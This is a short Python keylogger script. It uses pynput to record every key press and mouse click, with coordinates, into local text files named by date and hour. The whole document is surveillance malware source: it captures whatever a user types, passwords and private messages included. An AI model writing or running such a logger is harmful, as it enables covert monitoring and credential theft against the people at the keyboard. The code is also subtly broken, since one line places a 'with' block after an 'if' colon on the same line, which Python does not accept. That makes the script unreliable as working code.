from pynput import keyboard , mouse
import time

localc = time.localtime()
day = localc.tm_mday
mon = localc.tm_mon
hour = localc.tm_hour
def keys(key):
    with open(f"{mon}_{day}_{hour}_.txt", "a") as loKy:
        try:
            char = key.char
            loKy.write(char)
        except: loKy.write(f"\n KEY: {key}\n")

def click(x, y, buon, preed):
    if preed: with open(f"{mon}_{day}_{hour}_.txt", "a") as logMouse:logMouse.write(f" \nMouse ({x}, {y}) \n {buon}\n")
        
if __name__ == "__main__":
    keyboard_listener = keyboard.Listener(on_press=keys)
    mouse_listener = mouse.Listener(on_click=click)
    keyboard_listener.start()
    mouse_listener.start()
    input()
